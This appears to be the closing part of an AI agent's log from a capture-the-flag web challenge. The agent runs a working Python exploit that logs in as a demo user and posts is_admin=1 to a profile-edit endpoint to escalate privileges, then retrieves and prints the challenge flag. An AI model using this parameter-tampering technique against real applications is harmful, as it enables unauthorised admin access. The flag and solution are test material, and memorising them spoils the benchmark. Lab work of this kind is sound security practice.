--- iter 9 bash --- $ python3 - <<'PY' import requests,re s=requests.Session() s.post('http://127.0.0.1:9100/token',data={'username':'demo','password':'demo'},allow_redirects=False) s.post('http://127.0.0.1:9100/edit_profile/1',data={'name':'demo','is_admin':'1'}) r=s.get('http://127.0.0.1:9100/company/1/jobs') m=re.search(r'(?:FLAG|flag)\{[^}]+\}', r.text) print(m.group(0) if m else 'NOFLAG') PY FLAG{c3aa1ce79de44a89c2cc9598777acd4a950aa054f07b5d1efba2669012be883e} [stderr] /Users/faber/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 10 final --- PROOF: `python3 - <<'PY' import requests,re s=requests.Session() s.post('http://127.0.0.1:9100/token',data={'username':'demo','password':'demo'},allow_redirects=False) s.post('http://127.0.0.1:9100/edit_profile/1',data={'name':'demo','is_admin':'1'}) r=s.get('http://127.0.0.1:9100/company/1/jobs') m=re.search(r'(?:FLAG|flag)\{[^}]+\}', r.text) print(m.group(0) if m else 'NOFLAG') PY` Vulnerability: authenticated parameter tampering/IDOR-style privilege escalation. The demo user can POST `is_admin=1` to `/edit_profile/1` even though the field is only client-side disabled, then view the secret job entry at `/company/1/jobs`. FLAG: FLAG{c3aa1ce79de44a89c2cc9598777acd4a950aa054f07b5d1efba2669012be883e}
